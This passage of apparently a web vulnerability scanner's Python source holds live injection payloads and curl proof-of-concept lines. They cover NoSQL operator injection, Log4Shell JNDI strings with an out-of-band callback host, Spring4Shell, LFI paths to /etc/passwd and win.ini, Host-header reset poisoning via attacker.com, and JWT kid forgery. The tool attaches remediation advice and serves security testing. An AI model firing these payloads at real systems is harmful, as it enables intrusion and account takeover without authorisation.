    ("[$gt]",             ["error","null","0","false"]),
    ("[$regex]",          ["error","null","0","false"]),
]

def check_nosqli(endpoints:List[str]) -> List[dict]:
    findings=[]
    nosql_params=["username","user","email","login","id","search","query",
                  "filter","where","condition","sort","order"]
    tested=set()
    for ep in endpoints[:200]:
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        # Test ALL params, not just nosql-named ones
        all_nosql_params = [p for p in nosql_params if p in qs] +                            [p for p in qs.keys() if p not in nosql_params]
        for param in all_nosql_params[:6]:
            if param not in qs: continue
            key=(ep.split("?")[0],param)
            if key in tested: continue
            tested.add(key)
            base_url = ep.split("?")[0]
            # Phase 1: JSON body injection (POST)
            for payload,sigs in NOSQL_PAYLOADS:
                if isinstance(payload, str) and payload.startswith("[$"):
                    continue  # GET-only payloads
                try:
                    data=json.dumps({param:payload}).encode()
                    r=_req(base_url,"POST",
                           headers={"Content-Type":"application/json"},
                           data=data,timeout=8)
                    if not r: continue
                    if r[0] in (200,201) and any(s in r[2] for s in sigs):
                        findings.append(F("nosqli","critical",ep,
                            f"NoSQL injection in '{param}' (JSON body)",
                            param=param,payload=str(payload),
                            preview=r[2][:300],
                            poc=f"curl -X POST '{base_url}' -H 'Content-Type: application/json' -d '{json.dumps({param:payload})}'",
                            impact="Authentication bypass, data exfiltration from NoSQL database",
                            remediation="Validate input types, use parameterized queries for MongoDB."))
                        break
                except: pass
            # Phase 2: GET param operator injection (?param[$ne]=x)
            try:
                parsed2 = urllib.parse.urlparse(ep)
                qs2 = dict(urllib.parse.parse_qs(parsed2.query))
                for op in ["[$ne]","[$gt]","[$gte]","[$regex]","[$exists]"]:
                    nq = {k:v[0] for k,v in qs2.items()}
                    nq[f"{param}{op}"] = "1"
                    test = urllib.parse.urlunparse(parsed2._replace(
                        query=urllib.parse.urlencode(nq)))
                    r2 = _get(test, timeout=6)
                    base_r = _get(ep, timeout=6)
                    if r2 and base_r and r2[0]==200 and base_r[0]!=200:
                        findings.append(F("nosqli","critical",ep,
                            f"NoSQL GET-param injection in '{param}{op}'",
                            param=param, operator=op,
                            poc=f"curl '{test}'",
                            impact="Authentication bypass via MongoDB operator injection",
                            remediation="Sanitize all query parameters. Reject keys containing $ or dots."))
                        break
            except: pass
    return findings

# ── 26. LOG4SHELL ─────────────────────────────────────────────────────────────
def check_log4j(targets:List[str]) -> List[dict]:
    findings=[]
    # Test payloads that would trigger DNS lookup if vulnerable
    _oob = os.getenv("INTERACTSH_SERVER","oast.pro")
    _bxss = os.getenv("BXSS_HOST","")
    _log4j_host = _bxss if _bxss else f"bugscan-log4j.{_oob}"
    payload = f"${{jndi:ldap://{_log4j_host}/a}}"
    payload_rmi  = f"${{jndi:rmi://{_log4j_host}/a}}"
    payload_dns  = f"${{jndi:dns://{_log4j_host}/a}}"
    payload_lower = "${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:" + f"ldap://{_log4j_host}/a"
    payloads_all = [payload, payload_rmi, payload_dns,
                    f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{_log4j_host}/a}}",
                    f"${{lower:{payload}}}"]
    headers_to_test=["User-Agent","X-Forwarded-For","X-Api-Version",
                     "X-Client-IP","Referer","CF-Connecting-IP",
                     "X-Originating-IP","Authorization","Content-Type",
                     "Accept-Language","Accept","Cookie"]
    for url in targets[:20]:
        for header in headers_to_test:
            for pld in payloads_all[:3]:  # test multiple bypass variants
                r=_get(url,headers={header:pld},timeout=8)
                if not r: continue
                # 500/503 on User-Agent JNDI = likely vulnerable (server tried to process)
                if r[0] in (500,503) and header=="User-Agent":
                    findings.append(F("log4j","critical",url,
                        f"Potential Log4Shell (CVE-2021-44228) -- server error on JNDI payload",
                        payload=pld,header=header,status=str(r[0]),
                        oob_host=_log4j_host,
                        note=f"Verify OOB DNS callback at {_log4j_host}",
                        poc=f"curl -H '{header}: {pld}' '{url}'",
                        impact="Unauthenticated RCE -- one of the most critical CVEs in history",
                        remediation="Update Log4j to 2.17.1+, set log4j2.formatMsgNoLookups=true."))
                    break
    return findings

# ── 27. SPRING4SHELL ──────────────────────────────────────────────────────────
def check_spring4shell(targets:List[str]) -> List[dict]:
    findings=[]
    for url in targets[:20]:
        # Test Spring4Shell via class.module.classLoader
        payload="class.module.classLoader.DefaultAssertionStatus=x"
        r=_req(url.rstrip("/")+"/","POST",
               headers={"Content-Type":"application/x-www-form-urlencoded",
                        "Suffix":".jsp","c1":"Runtime","c2":"<%","DNT":"1",
                        "Content-Type":"application/x-www-form-urlencoded"},
               data=payload.encode(),timeout=10)
        if not r: continue
        if r and r[0]==400 and "Invalid" not in r[2]:
            findings.append(F("spring4shell","critical",url,
                "Potential Spring4Shell (CVE-2022-22965)",
                payload=payload,
                note="Verify with nuclei spring4shell template",
                poc=f"curl -X POST {url}/ -d '{payload}' -H 'Suffix: .jsp'",
                impact="Unauthenticated RCE on Spring MVC applications",
                remediation="Update Spring Framework to 5.3.18+/5.2.20+, JDK 9+ required for exploit."))
    return findings

# ── 28. MISCONFIGURATIONS ─────────────────────────────────────────────────────
def check_misconfig(targets:List[str]) -> List[dict]:
    findings=[]
    for url in targets[:50]:
        base=url.rstrip("/")
        # Security headers check
        r=_get(base,timeout=8)
        if not r: continue
        status,hdrs,body=r
        missing=[]
        if not hdrs.get("X-Frame-Options") and not hdrs.get("Content-Security-Policy"):
            missing.append("X-Frame-Options (clickjacking)")
        if not hdrs.get("X-Content-Type-Options"):
            missing.append("X-Content-Type-Options (MIME sniffing)")
        if not hdrs.get("Strict-Transport-Security"):
            missing.append("HSTS (downgrade attacks)")
        if not hdrs.get("Content-Security-Policy"):
            missing.append("Content-Security-Policy (XSS)")
        if not hdrs.get("Referrer-Policy"):
            missing.append("Referrer-Policy (info leak)")
        if not hdrs.get("Permissions-Policy"):
            missing.append("Permissions-Policy")
        if missing:
            findings.append(F("misconfig","medium",base,
                f"Missing security headers: {len(missing)} headers",
                missing_headers=missing,
                server=hdrs.get("Server",""),
                x_powered_by=hdrs.get("X-Powered-By",""),
                impact="Various attacks including clickjacking, MIME sniffing, XSS",
                remediation="Implement all recommended security response headers."))
        # Server banner disclosure
        server=hdrs.get("Server","")
        powered=hdrs.get("X-Powered-By","")
        if server and any(c.isdigit() for c in server):
            findings.append(F("misconfig","low",base,
                f"Server version disclosure: {server}",
                server=server,x_powered_by=powered,
                remediation="Remove Server header or suppress version information."))
        # Directory listing
        for path in ["/uploads/","/files/","/backup/","/images/","/static/","/assets/"]:
            r2=_get(base+path,timeout=6)
            if r2 and r2[0]==200 and ("Index of" in r2[2] or "Directory listing" in r2[2]
                                       or "<title>Index of" in r2[2]):
                findings.append(F("misconfig","high",base+path,
                    f"Directory listing enabled: {path}",
                    preview=r2[2][:300],
                    impact="Exposes all files in directory to attackers",
                    remediation="Disable directory listing in web server config."))

        # ── Source map exposure (.js.map) ─────────────────────────────────────
        # Source maps expose original source code to anyone who requests them
        for path in ["/js/app.js.map","/static/js/main.js.map","/bundle.js.map",
                     "/app.js.map","/dist/app.js.map","/assets/index.js.map"]:
            r3=_get(base+path,timeout=5)
            if r3 and r3[0]==200 and "sources" in r3[2] and "mappings" in r3[2]:
                findings.append(F("misconfig","medium",base+path,
                    "Source map exposed -- original source code accessible",
                    path=path,preview=r3[2][:200],
                    poc=f"curl -s '{base+path}' | python3 -m json.tool | head -20",
                    impact="Source maps expose original application source code, file paths, variable names",
                    remediation="Remove .map files from production or restrict access to internal IPs."))
        # Also check if any JS references source maps
        if r and "sourceMappingURL" in r[2]:
            import re as _re2
            maps = _re2.findall(r"sourceMappingURL=([^\s\"]+)", r[2])
            for mp in maps[:3]:
                if not mp.startswith("data:"):
                    findings.append(F("misconfig","low",base,
                        f"Source map referenced in response: {mp}",
                        source_map=mp,
                        impact="Source map URL reveals build tooling and may be accessible",
                        remediation="Remove sourceMappingURL comments from production bundles."))

        # ── Cookie security flags ─────────────────────────────────────────────
        cookie_header = hdrs.get("Set-Cookie","")
        if cookie_header:
            cookie_low = cookie_header.lower()
            issues = []
            if "secure" not in cookie_low:
                issues.append("missing Secure flag (cookie sent over HTTP)")
            if "httponly" not in cookie_low:
                issues.append("missing HttpOnly flag (accessible via JavaScript)")
            if "samesite" not in cookie_low:
                issues.append("missing SameSite flag (CSRF risk)")
            if issues:
                sev = "medium" if "httponly" not in cookie_low else "low"
                findings.append(F("misconfig",sev,base,
                    f"Insecure cookie flags: {', '.join(issues)}",
                    issues=issues,
                    cookie_preview=cookie_header[:200],
                    poc=f"curl -I '{base}' | grep Set-Cookie",
                    impact="Missing flags enable cookie theft via XSS (HttpOnly), interception (Secure), or CSRF (SameSite)",
                    remediation="Set Secure; HttpOnly; SameSite=Strict on all session cookies."))

        # ── Stack trace / debug info leakage ──────────────────────────────────
        stack_patterns = [
            "Traceback (most recent call last)",  # Python
            "at Object.<anonymous>",               # Node.js
            "java.lang.NullPointerException",     # Java
            "System.NullReferenceException",      # .NET
            "mysqli_fetch_assoc()",               # PHP MySQL
            "Warning: include(",                  # PHP warning
            "Parse error: syntax error",          # PHP parse
            "org.springframework.",               # Spring
            "rails/actionpack",                   # Rails
            "ActiveRecord::RecordNotFound",       # Rails
            "DEBUG = True",                       # Django debug
            "django.core.exceptions",             # Django
        ]
        body_check = r[2][:5000] if r else ""
        for pattern in stack_patterns:
            if pattern in body_check:
                findings.append(F("misconfig","medium",base,
                    f"Stack trace / debug info exposed: {pattern[:50]}",
                    pattern=pattern,preview=body_check[:400],
                    impact="Stack traces reveal application internals, file paths, library versions",
                    remediation="Disable debug mode in production. Implement custom error pages."))
                break  # one finding per host

        # ── Open API documentation exposure ──────────────────────────────────
        for api_path in ["/swagger-ui.html","/swagger-ui/","/api-docs","/api/docs",
                         "/swagger/index.html","/redoc","/openapi.json","/swagger.json",
                         "/v1/api-docs","/v2/api-docs","/v3/api-docs",
                         "/api/swagger-ui","/.well-known/api-catalog"]:
            r4=_get(base+api_path,timeout=5)
            if r4 and r4[0]==200 and any(s in r4[2][:2000] for s in
                    ["swagger","openapi","Swagger UI","SwaggerUI",
                     "ReDoc","api-docs","paths"]):
                findings.append(F("misconfig","medium",base+api_path,
                    f"API documentation publicly exposed: {api_path}",
                    path=api_path,
                    poc=f"Open in browser: {base+api_path}",
                    impact="Exposed API docs reveal all endpoints, parameters, and authentication methods",
                    remediation="Restrict API docs to internal IPs or require authentication."))
                break  # one finding per host

        # ── TLS/HTTPS check ──────────────────────────────────────────────────
        if base.startswith("http://"):
            # Check if HTTPS redirect happens
            https_base = "https://" + base[7:]
            r5=_get(https_base,timeout=6)
            if not r5 or r5[0] >= 500:
                findings.append(F("misconfig","medium",base,
                    "HTTPS not available or broken",
                    poc=f"curl -I '{https_base}'",
                    impact="Traffic is unencrypted -- credentials and session tokens exposed in transit",
                    remediation="Enable HTTPS with a valid TLS certificate. Redirect all HTTP to HTTPS."))
        else:
            # Check HSTS already done above in missing headers
            # Check for weak TLS indicator via headers
            via=hdrs.get("Via","")
            upgrade=hdrs.get("Upgrade-Insecure-Requests","")
            ssl_hdr=hdrs.get("Strict-Transport-Security","")
            if ssl_hdr and "max-age" in ssl_hdr.lower():
                try:
                    ma=int(re.search(r"max-age=(\d+)",ssl_hdr.lower()).group(1))
                    if ma < 15552000:  # less than 6 months
                        findings.append(F("misconfig","low",base,
                            f"HSTS max-age too short: {ma}s (recommended: 31536000)",
                            hsts=ssl_hdr,
                            remediation="Set HSTS max-age to at least 31536000 (1 year)."))
                except: pass

        # ── CORS misconfiguration indicator ──────────────────────────────────
        cors_r=_get(base,timeout=5,headers={"Origin":"https://evil-test.com"})
        if cors_r:
            acao = cors_r[1].get("Access-Control-Allow-Origin","")
            acac = cors_r[1].get("Access-Control-Allow-Credentials","")
            if acao == "https://evil-test.com" or acao == "*":
                sev = "high" if acac.lower()=="true" and acao!="*" else "medium"
                findings.append(F("misconfig",sev,base,
                    f"CORS misconfiguration: allows {acao}" + (" with credentials" if acac else ""),
                    allow_origin=acao,allow_credentials=acac,
                    poc=f"curl -H 'Origin: https://evil-test.com' -I '{base}'\nX: Access-Control-Allow-Origin: {acao}",
                    impact="Any website can make credentialed requests to this API" if acac else "Overly permissive CORS policy",
                    remediation="Restrict CORS to specific trusted origins. Never combine * with credentials."))

    # ── HTTP Verb Tampering ─────────────────────────────────────────────────
    for url in targets[:20]:
        base = url.rstrip("/")
        try:
            for method in ["TRACE","TRACK","CONNECT","DEBUG","PATCH","ARBITRARY"]:
                r = _req(base + "/", method=method, timeout=5)
                if not r: continue
                if r[0] in (200, 201, 301, 302) and method in ("TRACE","TRACK","DEBUG"):
                    findings.append(F("misconfig","medium", base,
                        f"HTTP Verb {method} enabled -- may leak headers/enable XST",
                        method=method, status=r[0],
                        poc=f"curl -X {method} '{base}/'",
                        impact="Cross-Site Tracing (XST) or server info leak via TRACE",
                        remediation=f"Disable HTTP {method} method in server config."))
                    break
        except: pass

    # ── Path Normalization Bypass ─────────────────────────────────────────
    for url in targets[:10]:
        base = url.rstrip("/")
        for bypass_path in ["/..;/admin", "/.//admin", "/admin/..", "/ADMIN",
                             "/%2e%2e/admin", "/admin%20", "//admin",
                             "/;/admin", "/%09/admin"]:
            try:
                r1 = _get(base + "/admin", timeout=5)
                r2 = _get(base + bypass_path, timeout=5)
                if (r1 and r2 and r1[0] in (401,403)
                        and r2[0] == 200 and len(r2[2]) > 200):
                    findings.append(F("misconfig","critical", base + bypass_path,
                        f"Path normalization bypass -- admin accessible via bypass",
                        bypass_path=bypass_path,
                        poc=f"curl '" + base + bypass_path + "'",
                        impact="Access to protected admin endpoints bypassing auth",
                        remediation="Normalize paths before auth checks. Use canonical URL.",
                        confidence=80))
                    break
            except: pass

    # ── Log Injection ────────────────────────────────────────────────────
    for url in targets[:10]:
        try:
            canary = "BUGSCAN-LOG-INJECT-\r\nCRLF-CONFIRMED"
            r = _get(url, headers={"User-Agent": canary}, timeout=5)
            if r and r[0] == 200:
                findings.append(F("misconfig","low", url,
                    "Potential log injection via User-Agent (CRLF in header accepted)",
                    poc=f"curl -A '{canary}' '{url}'",
                    impact="Log poisoning -- inject fake log entries, evade detection",
                    remediation="Sanitize all user-controlled data before logging."))
        except: pass


    # ── Error-based LFI (reveals path in error message) ─────────────────────
    ERROR_PAYLOADS = [
        "/etc/passwd/.",          # Trailing dot causes different error if file exists
        "/etc/passwd%00",         # Null byte (old PHP)
        "....//....//etc/passwd", # Double-slash bypass
        "..%252f..%252fetc%252fpasswd",  # Double URL encode
        "/proc/self/environ",
        "/proc/self/cmdline",
    ]
    ERROR_SIGS = [
        "No such file","failed to open","cannot open",
        "include_path","fopen failed","file_get_contents",
        "open_basedir","Permission denied","/var/www","/home/","/usr/",
    ]
    _err_tested = set()
    for ep in targets[:100]:
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in list(qs.keys())[:5]:
            key2 = (ep.split("?")[0], param)
            if key2 in _err_tested: continue
            _err_tested.add(key2)
            for pl in ERROR_PAYLOADS[:4]:
                nq = dict(qs); nq[param] = [pl]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=6)
                if not r: continue
                if any(sig.lower() in r[2].lower() for sig in ERROR_SIGS):
                    findings.append(F("lfi","medium",ep,
                        f"Error-based LFI indicator via '{param}'",
                        param=param, payload=pl,
                        preview=r[2][:300],
                        poc=f"curl '{test}'",
                        impact="LFI potential -- error reveals server file system paths",
                        remediation="Whitelist allowed file paths. Never use user input in file operations.",
                        confidence=65))
                    break

    return findings

# ════════════════════════════════════════════════════════════════════
# MAIN SCAN ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════
def check_lfi_win(endpoints: List[str]) -> List[dict]:
    """LFI -- Windows path traversal variants."""
    findings = []
    WIN_PATHS = [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\boot.ini",
        "c:\\windows\\win.ini",
        "c:/windows/win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        "....//....//....//windows//win.ini",
    ]
    WIN_SIGS = ["[fonts]", "[extensions]", "[boot loader]", "for 16-bit"]
    for ep in endpoints[:100]:
        if '=' not in ep: continue
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in list(qs.keys())[:3]:
            for wp in WIN_PATHS[:4]:
                nq = dict(qs); nq[param] = [wp]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=5)
                if r and any(sig in r[2] for sig in WIN_SIGS):
                    findings.append(F('lfi', 'critical', test,
                        f"Windows LFI: {wp}",
                        payload=wp, param=param,
                        poc=f"curl '{test}'",
                        impact="Read Windows system files -- credential exposure",
                        remediation="Validate file paths with strict allowlist. Use realpath() check."))
                    break
    return findings


# ── Cache Poisoning ───────────────────────────────────────────────────────────
CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host",    "cpcanary.evil.com"),
    ("X-Host",              "cpcanary.evil.com"),
    ("X-Forwarded-Server",  "cpcanary.evil.com"),
    ("X-HTTP-Host-Override","cpcanary.evil.com"),
    ("Forwarded",           "host=cpcanary.evil.com"),
    ("X-Forwarded-Proto",   "https"),
    ("X-Forwarded-For",     "127.0.0.1"),
    ("CF-Connecting-IP",    "127.0.0.1"),
    ("X-Original-URL",      "/admin"),
    ("X-Rewrite-URL",       "/admin"),
    ("X-Forwarded-Port",    "443"),
]

def _is_cacheable(hdrs: dict) -> bool:
    cc = hdrs.get("Cache-Control", "").lower()
    if any(x in cc for x in ["no-cache","no-store","private"]): return False
    return bool("X-Cache" in hdrs or "CF-Cache-Status" in hdrs or
                "public" in cc or "max-age" in cc or hdrs.get("Age"))

def check_cache_poisoning(endpoints: List[str], live_hosts: List[str]) -> List[dict]:
    """Cache poisoning: X-Forwarded-Host, X-Original-URL, fat GET."""
    findings = []
    tested   = set()
    canary   = "cptest-bugscan-" + str(int(time.time()))[-6:]
    test_targets = list(set(live_hosts[:20] + [
        e for e in endpoints[:30]
        if not re.search(r'\.(js|css|png|jpg|gif|ico|svg)$', e, re.I)
    ]))[:40]

    for url in test_targets:
        if url in tested: continue
        tested.add(url)
        try:
            base = _get(url, timeout=8)
            if not base: continue
            for hdr_name, hdr_val in CACHE_POISON_HEADERS[:8]:
                test_val = (canary + ".evil.com") if "host" in hdr_name.lower() else hdr_val
                r = _req(url, "GET", headers={hdr_name: test_val}, timeout=8)
                if not r: continue
                _, r_hdrs, r_body = r
                if canary in r_body or test_val in r_body:
                    cacheable = _is_cacheable(r_hdrs)
                    # Downgrade: reflection alone is LOW confidence
                    # Only HIGH if also cacheable (cache key gap confirmed)
                    if not cacheable:
                        # Mere reflection without caching = low signal, skip to reduce FP
                        log.debug(f"[cache_poison] reflection only (not cached) at {url} header={hdr_name}")
                        continue
                    sev = "critical" if cacheable else "high"
                    findings.append(F("cache_poison", sev, url,
                        f"Cache poisoning via {hdr_name} -- value reflected in cacheable response",
                        header=hdr_name, injected=test_val,
                        cacheable=cacheable,
                        confidence=75,  # not 99 — needs manual cache key gap verification
                        poc=(f"curl -H '{hdr_name}: attacker.com' '{url}'\n"
                             f"# Value reflected in response body"),
                        impact="Cached response poisoned -- all users receive attacker content",
                        remediation="Remove unkeyed headers from cache. Vary on X-Forwarded-Host.")); break
            # X-Original-URL path override
            for override in ["/admin", "/internal", "/actuator"]:
                r = _req(url, "GET", headers={"X-Original-URL": override,
                                               "X-Rewrite-URL": override}, timeout=5)
                if r and r[0] == 200 and (not base or base[0] != 200):
                    findings.append(F("cache_poison", "critical", url,
                        f"X-Original-URL override to {override} returns 200",
                        poc=f"curl -H 'X-Original-URL: {override}' '{url}'",
                        impact="Access control bypass via header override",
                        remediation="Do not trust X-Original-URL from clients.")); break
        except Exception as e: log.debug(f"cache_poison {url}: {e}")
    return findings


# ── Mass Assignment ───────────────────────────────────────────────────────────
MASS_ASSIGN_FIELDS = [
    ("role",         ["admin", "administrator", "superuser"]),
    ("is_admin",     ["true", "1"]),
    ("isAdmin",      ["true", "1"]),
    ("admin",        ["true", "1"]),
    ("user_type",    ["admin", "staff"]),
    ("account_type", ["premium", "admin"]),
    ("plan",         ["enterprise", "unlimited"]),
    ("verified",     ["true", "1"]),
    ("active",       ["true", "1"]),
    ("approved",     ["true", "1"]),
    ("price",        ["0", "0.01", "-1"]),
    ("credits",      ["9999999"]),
    ("balance",      ["9999999"]),
]

# ── Password Reset Poisoning ──────────────────────────────────────────────────
RESET_PATHS = [
    "/forgot-password", "/reset-password", "/password/reset",
    "/auth/reset", "/account/forgot", "/api/auth/reset",
    "/api/password/reset", "/api/forgot", "/api/v1/password/forgot",
    "/users/password", "/recover", "/recovery",
]
RESET_POISON_HEADERS = [
    ("Host",               "attacker.com"),
    ("X-Forwarded-Host",   "attacker.com"),
    ("X-Host",             "attacker.com"),
    ("X-Forwarded-Server", "attacker.com"),
    ("Forwarded",          "host=attacker.com"),
    ("X-Original-Host",    "attacker.com"),
]

def check_password_reset_poison(live_hosts: List[str]) -> List[dict]:
    """Password reset link poisoning via Host header."""
    findings = []
    canary   = "prp-" + str(int(time.time()))[-6:] + ".attacker.com"
    tested   = set()

    for host in live_hosts[:20]:
        base = host.rstrip("/")
        for path in RESET_PATHS:
            url = base + path
            if url in tested: continue
            tested.add(url)
            try:
                probe = _get(url, timeout=5)
                if not probe or probe[0] not in (200, 405, 422, 400, 302): continue

                for hdr_name, _ in RESET_POISON_HEADERS:
                    test_val = canary
                    hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
                    if hdr_name == "Host":
                        hdrs["Host"] = test_val
                        hdrs["X-Forwarded-Host"] = test_val
                    else:
                        hdrs[hdr_name] = test_val

                    r = _req(url, "POST", headers=hdrs,
                             data=b"email=test@example.com", timeout=8)
                    if not r: continue
                    if r[0] in (200, 201, 302, 204):
                        reflected = canary in r[2] or any(canary in str(v) for v in r[1].values())
                        sev = "critical" if reflected else "high"
                        findings.append(F("reset_poison", sev, url,
                            f"Password reset poisoning via {hdr_name}",
                            header=hdr_name, injected=test_val,
                            reflected=reflected,
                            poc=(f"curl -X POST '{url}' -H '{hdr_name}: attacker.com'"
                                 f" -d 'email=victim@target.com'"
                                 f"\n# Victim receives reset link pointing to attacker.com"),
                            impact="Account takeover -- victim clicks poisoned reset link",
                            remediation="Build reset URLs from config, never from request Host header.")); break
            except Exception as e: log.debug(f"reset_poison {url}: {e}")
    return findings


# ── Standalone Port Scanner ─────────────────────────────────────────────────
def run_port_scan(domain: str, hosts: list, mode: str = "top100",
                  custom_ports: str = "", q=None) -> list:
    """
    Run port scan against a list of hosts.
    Uses naabu/nmap/masscan if available, falls back to Python sockets.
    Returns list of "host:port" strings.
    """
    import socket as _sock, concurrent.futures as _cf
    results = []

    # ── SERVER-SIDE GUARD: mode=all is NEVER permitted via any caller ─────────
    # This blocks the /port_scan route, scanner.py internal calls, saved jobs,
    # and any direct import. No client flag or URL param can bypass this.
    if mode == "all":
        log.warning(
            f"[port_scan] GUARD: mode=all BLOCKED for {domain} — "
            f"downgraded to top100. Full 65535-port scan is disabled server-side."
        )
        mode = "top100"

    if mode == "all":  # dead branch — kept so port_list logic below still compiles
        port_list = list(range(1, 65536))
    elif mode == "custom" and custom_ports:
        port_list = []
        for part in custom_ports.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    a, b = part.split("-", 1)
                    port_list.extend(range(int(a), int(b)+1))
                except: pass
            elif part.isdigit():
                port_list.append(int(part))
    else:
        port_list = [
            21,22,23,25,53,80,81,88,110,111,119,135,139,143,161,389,
            443,445,465,587,636,993,995,1080,1433,1521,1723,2049,2082,
            2083,2086,2087,2095,2096,2181,2222,2375,2376,2379,2380,
            3000,3001,3128,3268,3269,3306,3389,3690,4000,4040,4443,
            4567,4848,5000,5001,5432,5601,5900,5984,6379,6443,6666,
            7001,7002,7070,7443,7474,7777,8000,8001,8008,8009,8080,
            8081,8082,8083,8086,8087,8088,8089,8090,8091,8092,8093,
            8094,8095,8096,8098,8099,8100,8161,8180,8181,8222,8243,
            8333,8383,8443,8500,8530,8531,8888,8889,8983,9000,9001,
            9002,9090,9091,9092,9093,9100,9200,9300,9418,9443,9999,
            10000,10250,10255,11211,27017,27018,27019,28017,50000,
            50070,50075,61616,
        ]

    # Resolve hostnames to IPs
    ips = []
    for h in hosts[:20]:
        try:
            ip = _sock.gethostbyname(h)
            ips.append((h, ip))
        except:
            ips.append((h, h))

    def _probe(args):
        host_label, host_ip, port = args
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(0.8)
            r = s.connect_ex((host_ip, port))
            s.close()
            if r == 0:
                entry = f"{host_label}:{port}"
                if q: q.put({"type": "port", "entry": entry})
                return entry
        except: pass
        return None

    tasks = [(hl, hi, p) for hl, hi in ips for p in port_list]
    workers = min(500, max(50, len(port_list)))
    log.info(f"[port_scan] {len(tasks)} probes ({len(ips)} hosts × {len(port_list)} ports)")

    timeout = 600 if mode == "all" else 90
    _porte = _cf.ThreadPoolExecutor(max_workers=workers)
    try:
        for entry in _porte.map(_probe, tasks, timeout=timeout):
            if entry:
                results.append(entry)
    except Exception as e:
        log.debug(f"[port_scan] {e}")
    finally:
        _porte.shutdown(wait=False)

    log.info(f"[port_scan] done: {len(results)} open ports")
    return results


# ── CONNECTION POOL (SSL reuse for 10-20x speed) ──────────────────────────────
import http.client as _http_client
_CONN_POOL: dict = {}
_CONN_LOCK = threading.Lock()
_DNS_CACHE: dict = {}


def check_jwt_kid(endpoints: List[str]) -> List[dict]:
    """JWT kid path traversal, SQLi, and JWKS spoofing."""
    findings = []
    import base64 as _b64, json as _json, re as _re

    def _b64url(data: bytes) -> str:
        return _b64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _b64url_d(s: str) -> bytes:
        s += "=" * (4 - len(s) % 4)
        return _b64.urlsafe_b64decode(s)

    def _forge_kid(token: str, kid_val: str, secret: bytes = b"") -> str:
        try:
            parts = token.split(".")
            hdr   = _json.loads(_b64url_d(parts[0]))
            hdr["kid"] = kid_val
            hdr["alg"] = "HS256"
            nhdr = _b64url(_json.dumps(hdr, separators=(",",":")).encode())
            import hmac as _hmac, hashlib as _hsh
            sig  = _hmac.new(secret, f"{nhdr}.{parts[1]}".encode(), _hsh.sha256).digest()
            return f"{nhdr}.{parts[1]}.{_b64url(sig)}"
        except: return ""

    jwt_re = _re.compile(r"eyJ[A-Za-z0-9_-]{10,}[.][A-Za-z0-9_-]{10,}[.][A-Za-z0-9_-]*")

    for ep in endpoints[:100]:
        r = _get(ep, timeout=8)
        if not r: continue
        _, hdrs, body = r

        tokens = set(jwt_re.findall(body))
        for hv in hdrs.values():
            tokens.update(jwt_re.findall(str(hv)))

        for token in list(tokens)[:2]:
            try:
                hdr = _json.loads(_b64url_d(token.split(".")[0]))
            except: continue

            auth_eps = [ep] + [e for e in endpoints[:20]
                               if any(k in e.lower() for k in ["user","profile","me","admin"])]

            # Attack 1: kid path traversal
            for kid_val, secret in [
                ("../../dev/null", b""),
                ("../../../dev/null", b""),
                ("/dev/null", b""),
            ]:
                forged = _forge_kid(token, kid_val, secret)
                if not forged: continue
                for aep in auth_eps[:3]:
                    tr = _get(aep, timeout=6,
                              headers={"Authorization": f"Bearer {forged}",
                                       "Cookie": f"token={forged}"})
                    if tr and tr[0] == 200 and tr[2] != body:
                        findings.append(F("jwt","critical",aep,
                            f"JWT kid path traversal via '{kid_val}'",
                            kid_payload=kid_val,
                            poc=f"jwt_tool '{token}' -I -hc kid -hv '{kid_val}' -S hs256 -p ''",
                            impact="Authentication bypass via kid parameter path traversal",
                            remediation="Validate kid against allowlist. Never use as file path.",
                            confidence=90))
                        break

            # Attack 2: SQLi in kid
            for sql_kid in ["' UNION SELECT 'hacked'--", "0 OR 1=1"]:
                forged = _forge_kid(token, sql_kid, b"hacked")
                if not forged: continue
                for aep in auth_eps[:2]:
                    tr = _get(aep, timeout=6,
                              headers={"Authorization": f"Bearer {forged}"})
                    if tr and tr[0] == 200:
                        findings.append(F("jwt","critical",aep,
                            f"JWT kid SQL injection",
                            kid_payload=sql_kid,
                            poc=f"Forge JWT with kid: {sql_kid}",
                            impact="Auth bypass via SQLi in JWT key ID lookup",
                            remediation="Parameterized query for kid lookup.",
                            confidence=72))
                        break

            # Attack 3: jku/x5u JWKS spoofing vector
            if "jku" in hdr or "x5u" in hdr:
                jku = hdr.get("jku","") or hdr.get("x5u","")
                findings.append(F("jwt","high",ep,
                    "JWT uses jku/x5u -- JWKS spoofing possible",
                    jku_url=jku, header=str(hdr),
                    poc="Serve attacker JWKS at controlled URL, forge JWT with jku pointing there",
                    impact="Replace JWKS with attacker key -- forge any identity",
                    remediation="Reject jku/x5u. Pin JWKS URL server-side.",
                    confidence=70))

    return findings


# ── WEBSOCKET CSWSH ───────────────────────────────────────────────────────────
def check_websocket_security(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Cross-Site WebSocket Hijacking + unencrypted ws:// detection."""
    findings = []
    import re as _re

    for url in targets[:50]:
        r = _get(url, timeout=8)
        if not r: continue
        body = r[2]

        # Find ws:// and wss:// in page source
        ws_urls = set(_re.findall(r"wss?://[^\x20\t\n\"'<>]+", body))
        for m in _re.finditer(r"new WebSocket[(][^)]+[)]", body):
            wu = m.group(1)
            if wu.startswith("/"): wu = url.rstrip("/") + wu
            ws_urls.add(wu)

        for ws_path in ["/ws","/websocket","/socket","/socket.io","/cable","/realtime"]:
            base = url.rstrip("/")
            ws_urls.add(base.replace("https://","wss://").replace("http://","ws://") + ws_path)

